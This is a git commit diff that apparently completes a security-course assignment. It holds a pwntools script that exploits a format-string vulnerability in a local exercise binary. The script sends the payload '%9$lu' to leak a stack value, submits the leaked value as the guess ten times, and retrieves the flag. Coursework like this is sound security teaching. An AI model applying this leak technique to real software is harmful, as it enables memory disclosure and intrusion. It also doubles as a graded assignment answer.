8cd2bdababeb816feef10f1de62df51af5e3fd11
Ethan Cheng <ethan@nijika.org>
2025-11-07 19:25:24 -0800

    complete part 1

--- assignment-2/1-format-me/part1.py
+++ assignment-2/1-format-me/part1.py
@@ -2,22 +2,22 @@
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
-exe = ELF("./format-me-test")
+exe = ELF("./format-me")
 
 r = process([exe.path])
 # r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
 
 for _ in range(10):
     # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
-    leak = r.recvline()
+    r.recvuntil(b"Recipient?") # Think about what should be received first?
+    r.sendline(b"%9$lu") # Add your format string code here!
+    leak = r.recvline().strip()
     # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
+    val = leak.split()[-1] # you need to fill in idx_1, and idx_2 by yourself
     
-    r.recvuntil(b"xxx") #Think about what should be received?
+    r.recvuntil(b"Guess?") #Think about what should be received?
     r.sendline(val) 
-    r.recvuntil(b"Correct")
+    r.recvuntil(b"Correct code! Package sent.")
 
 r.recvuntil(b"Here's your flag: ")
 r.interactive()
